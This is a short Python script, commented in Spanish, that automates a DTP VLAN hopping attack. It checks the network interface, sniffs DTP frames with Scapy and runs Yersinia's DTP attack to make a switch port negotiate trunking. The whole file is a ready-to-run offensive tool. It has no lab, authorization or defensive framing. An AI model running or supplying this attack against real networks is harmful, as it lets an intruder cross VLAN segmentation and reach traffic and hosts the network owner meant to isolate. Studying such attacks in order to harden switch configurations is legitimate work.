#!/usr/bin/env python3

"""
DTP VLAN Hopping Automated Attack
Autor: Richard Marte
Requiere: Yersinia + Scapy
"""

import subprocess
import threading
import time
import os
from scapy.all import *

INTERFACE = "eth0"   # CAMBIA si es necesario
DTP_MULTICAST = "01:00:0c:cc:cc:cc"

# -------------------------------
# Verificar interfaz
# -------------------------------

def check_interface():
    print("[*] Verificando interfaz...")
    result = os.system(f"ip link show {INTERFACE} > /dev/null 2>&1")
    if result != 0:
        print("[!] Interfaz no encontrada.")
        exit(1)
    print("[+] Interfaz válida:", INTERFACE)

# -------------------------------
# Monitoreo DTP con Scapy
# -------------------------------

def monitor_dtp():
    print("[*] Monitoreando tráfico DTP...")

    def detect(pkt):
        if pkt.haslayer(Ether):
            if pkt[Ether].dst.lower() == DTP_MULTICAST:
                print("\n[+] Trama DTP detectada!")
                print("    Source MAC:", pkt[Ether].src)
                print("    Destination:", pkt[Ether].dst)

    sniff(iface=INTERFACE, prn=detect, store=False)

# -------------------------------
# Lanzar ataque real con Yersinia
# -------------------------------

def launch_attack():
    print("[+] Ejecutando ataque DTP con Yersinia...")
    time.sleep(2)

    subprocess.call([
        "yersinia",
        "dtp",
        "-attack",
        "1",
        "-interface",
        INTERFACE
    ])

# -------------------------------
# MAIN
# -------------------------------

if __name__ == "__main__":

    print("\n========== DTP VLAN HOPPING ATTACK ==========\n")

    check_interface()

    monitor_thread = threading.Thread(target=monitor_dtp, daemon=True)
    monitor_thread.start()

    time.sleep(2)

    launch_attack()